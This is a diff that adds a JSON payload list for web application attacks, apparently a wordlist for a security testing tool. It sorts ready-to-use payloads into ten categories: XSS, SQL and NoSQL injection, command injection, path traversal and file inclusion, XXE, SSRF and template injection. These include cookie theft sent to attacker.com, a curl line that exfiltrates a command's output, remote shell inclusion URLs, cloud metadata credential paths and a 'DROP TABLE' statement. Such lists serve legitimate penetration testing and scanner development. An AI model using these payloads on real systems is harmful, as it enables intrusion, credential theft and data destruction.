@@ -1,1 +1,217 @@
-{}
+{
+  "xss": {
+    "description": "Cross-Site Scripting payloads",
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<script>alert(1)</script>",
+      "<script>alert(document.cookie)</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "<iframe src=javascript:alert('XSS')></iframe>",
+      "<body onload=alert('XSS')>",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<select onchange=alert('XSS')><option>1</option></select>",
+      "javascript:alert('XSS')",
+      "javascript:alert(1)",
+      "javascript:alert(document.cookie)",
+      "data:text/html,<script>alert('XSS')</script>",
+      "vbscript:msgbox('XSS')",
+      "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
+      "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
+    ]
+  },
+  "sqli": {
+    "description": "SQL Injection payloads",
+    "payloads": [
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "' OR 1=1#",
+      "' UNION SELECT NULL--",
+      "' UNION SELECT NULL,NULL--",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "'; DROP TABLE users--",
+      "'; INSERT INTO users VALUES ('hacker','password')--",
+      "' AND (SELECT COUNT(*) FROM users)>0--",
+      "' AND (SELECT LENGTH(password) FROM users WHERE id=1)>0--",
+      "admin'--",
+      "admin'#",
+      "admin'/*",
+      "' OR 'x'='x",
+      "' OR 1=1 LIMIT 1--",
+      "1' ORDER BY 1--",
+      "1' ORDER BY 2--",
+      "1' ORDER BY 3--",
+      "1' UNION SELECT 1,2,3--",
+      "1' UNION SELECT 'a','b','c'--"
+    ]
+  },
+  "command_injection": {
+    "description": "Command Injection payloads",
+    "payloads": [
+      "; ls -la",
+      "; cat /etc/passwd",
+      "; whoami",
+      "; id",
+      "| ls -la",
+      "| cat /etc/passwd",
+      "| whoami",
+      "| id",
+      "&& ls -la",
+      "&& cat /etc/passwd",
+      "&& whoami",
+      "&& id",
+      "`ls -la`",
+      "`cat /etc/passwd`",
+      "`whoami`",
+      "`id`",
+      "$(ls -la)",
+      "$(cat /etc/passwd)",
+      "$(whoami)",
+      "$(id)",
+      "; ping -c 1 127.0.0.1",
+      "; sleep 5",
+      "; curl http://attacker.com/$(whoami)"
+    ]
+  },
+  "path_traversal": {
+    "description": "Path Traversal payloads",
+    "payloads": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "....//....//....//etc/passwd",
+      "..%2F..%2F..%2Fetc%2Fpasswd",
+      "..%252F..%252F..%252Fetc%252Fpasswd",
+      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
+      "/etc/passwd",
+      "C:\\windows\\system32\\drivers\\etc\\hosts",
+      "file:///etc/passwd",
+      "file:///C:/windows/system32/drivers/etc/hosts",
+      "php://filter/convert.base64-encode/resource=/etc/passwd",
+      "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyAtbGEiKTs/Pg=="
+    ]
+  },
+  "lfi": {
+    "description": "Local File Inclusion payloads",
+    "payloads": [
+      "../../../etc/passwd",
+      "../../../etc/hosts",
+      "../../../etc/issue",
+      "../../../proc/version",
+      "../../../proc/cpuinfo",
+      "../../../proc/meminfo",
+      "../../../proc/net/tcp",
+      "../../../var/log/apache2/access.log",
+      "../../../var/log/apache2/error.log",
+      "../../../var/log/nginx/access.log",
+      "../../../var/log/nginx/error.log",
+      "../../../var/www/html/index.php",
+      "../../../var/www/html/config.php",
+      "../../../var/www/html/wp-config.php",
+      "../../../windows/system32/drivers/etc/hosts",
+      "../../../windows/system32/drivers/etc/networks",
+      "../../../windows/system32/drivers/etc/protocols",
+      "../../../windows/system32/drivers/etc/services"
+    ]
+  },
+  "rfi": {
+    "description": "Remote File Inclusion payloads",
+    "payloads": [
+      "http://attacker.com/shell.txt",
+      "http://attacker.com/shell.php",
+      "http://attacker.com/shell.jsp",
+      "http://attacker.com/shell.asp",
+      "ftp://attacker.com/shell.txt",
+      "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyAtbGEiKTs/Pg==",
+      "php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt",
+      "expect://id",
+      "input://id",
+      "phar://shell.phar"
+    ]
+  },
+  "xxe": {
+    "description": "XML External Entity payloads",
+    "payloads": [
+      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
+      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]><data>&evil;</data>"
+    ]
+  },
+  "ssrf": {
+    "description": "Server-Side Request Forgery payloads",
+    "payloads": [
+      "http://127.0.0.1",
+      "http://localhost",
+      "http://0.0.0.0",
+      "http://[::1]",
+      "http://127.0.0.1:22",
+      "http://127.0.0.1:80",
+      "http://127.0.0.1:443",
+      "http://127.0.0.1:8080",
+      "http://127.0.0.1:3306",
+      "http://127.0.0.1:5432",
+      "http://127.0.0.1:6379",
+      "http://127.0.0.1:27017",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/user-data/",
+      "http://169.254.169.254/latest/dynamic/instance-identity/document",
+      "http://metadata.google.internal/computeMetadata/v1/",
+      "http://169.254.169.254/metadata/v1/",
+      "http://169.254.169.254/metadata/v1/instance",
+      "http://169.254.169.254/metadata/v1/instance/id",
+      "http://169.254.169.254/metadata/v1/instance/security-credentials/"
+    ]
+  },
+  "template_injection": {
+    "description": "Template Injection payloads",
+    "payloads": [
+      "{{7*7}}",
+      "{{7*'7'}}",
+      "{{config}}",
+      "{{config.items()}}",
+      "{{''.__class__.__mro__[1].__subclasses__()}}",
+      "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
+      "${7*7}",
+      "${7*'7'}",
+      "${config}",
+      "${config.items()}",
+      "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
+      "#{7*7}",
+      "#{7*'7'}",
+      "#{config}",
+      "#{config.items()}",
+      "#{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
+      "<%= 7*7 %>",
+      "<%= 7*'7' %>",
+      "<%= config %>",
+      "<%= config.items() %>",
+      "<%= system('id') %>"
+    ]
+  },
+  "no_sql_injection": {
+    "description": "NoSQL Injection payloads",
+    "payloads": [
+      "' || '1'=='1",
+      "' || 1==1",
+      "' || 1==1//",
+      "' || 1==1#",
+      "' || 1==1/*",
+      "' || 'a'=='a",
+      "' || 'x'=='x",
+      "' || true",
+      "' || 1",
+      "' || '1'=='1' || '",
+      "' || 1==1 || '",
+      "' || true || '",
+      "' || 1 || '",
+      "admin' || '1'=='1",
+      "admin' || 1==1",
+      "admin' || true",
+      "admin' || 1",
+      "' || this.username=='admin",
+      "' || this.password=='admin",
+      "' || this.role=='admin"
+    ]
+  }
+}
